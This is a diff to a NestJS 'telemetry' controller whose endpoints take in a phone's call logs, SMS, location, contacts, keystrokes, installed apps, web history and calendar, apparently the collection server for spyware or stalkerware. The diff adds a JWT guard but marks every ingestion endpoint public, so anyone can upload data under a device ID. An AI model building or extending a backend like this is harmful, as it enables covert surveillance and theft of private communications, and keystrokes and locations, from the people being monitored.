@@ -1,4 +1,4 @@
-import { Controller, Get, Post, Body, Query, Param } from '@nestjs/common';
+import { Controller, Get, Post, Body, Query, Param, UseGuards } from '@nestjs/common';
 import { 
   TelemetryService, 
   CallLogDto, 
@@ -10,18 +10,23 @@ import {
   WebHistoryDto, 
   CalendarEventDto 
 } from './telemetry.service';
+import { JwtAuthGuard } from '../auth/guards/jwt-auth.guard';
+import { Public } from '../auth/decorators/public.decorator';
 
+@UseGuards(JwtAuthGuard)
 @Controller('telemetry')
 export class TelemetryController {
   constructor(private readonly telemetryService: TelemetryService) {}
 
   // Normalized Event Stream Ingestion Endpoint (POST /api/v1/telemetry/events)
+  @Public()
   @Post('events')
   async ingestEvents(@Body() body: { deviceId?: string; events?: any[] }) {
     return this.telemetryService.ingestEvents(body.deviceId || 'dev_01', body.events || []);
   }
 
   // 1. Calls Endpoints
+  @Public()
   @Post('calls')
   async ingestCalls(@Query('deviceId') deviceId: string, @Body() body: { logs: CallLogDto[] }) {
     return this.telemetryService.ingestCalls(deviceId, body.logs || []);
@@ -33,6 +38,7 @@ export class TelemetryController {
   }
 
   // 2. SMS Endpoints
+  @Public()
   @Post('sms')
   async ingestSms(@Query('deviceId') deviceId: string, @Body() body: { logs: SmsLogDto[] }) {
     return this.telemetryService.ingestSms(deviceId, body.logs || []);
@@ -44,6 +50,7 @@ export class TelemetryController {
   }
 
   // 3. Location Endpoints
+  @Public()
   @Post('location')
   async ingestLocations(@Query('deviceId') deviceId: string, @Body() body: { locations: LocationLogDto[] }) {
     return this.telemetryService.ingestLocations(deviceId, body.locations || []);
@@ -55,6 +62,7 @@ export class TelemetryController {
   }
 
   // 4. Contacts Endpoints
+  @Public()
   @Post('contacts')
   async ingestContacts(@Query('deviceId') deviceId: string, @Body() body: { contacts: ContactItemDto[] }) {
     return this.telemetryService.ingestContacts(deviceId, body.contacts || []);
@@ -66,6 +74,7 @@ export class TelemetryController {
   }
 
   // 5. Keylogger Endpoints
+  @Public()
   @Post('keylogger')
   async ingestKeylogger(@Query('deviceId') deviceId: string, @Body() body: { keylogs: KeylogItemDto[] }) {
     return this.telemetryService.ingestKeylogger(deviceId, body.keylogs || []);
@@ -77,6 +86,7 @@ export class TelemetryController {
   }
 
   // 6. Installed Apps Endpoints
+  @Public()
   @Post('installed-apps')
   async ingestInstalledApps(@Query('deviceId') deviceId: string, @Body() body: { apps: InstalledAppDto[] }) {
     return this.telemetryService.ingestInstalledApps(deviceId, body.apps || []);
@@ -108,6 +118,7 @@ export class TelemetryController {
   }
 
   // 7. Web History Endpoints
+  @Public()
   @Post('web-history')
   async ingestWebHistory(@Query('deviceId') deviceId: string, @Body() body: { history: WebHistoryDto[] }) {
     return this.telemetryService.ingestWebHistory(deviceId, body.history || []);
@@ -119,6 +130,7 @@ export class TelemetryController {
   }
 
   // 8. Calendar Events Endpoints
+  @Public()
   @Post('calendar')
   async ingestCalendar(@Query('deviceId') deviceId: string, @Body() body: { events: CalendarEventDto[] }) {
     return this.telemetryService.ingestCalendar(deviceId, body.events || []);
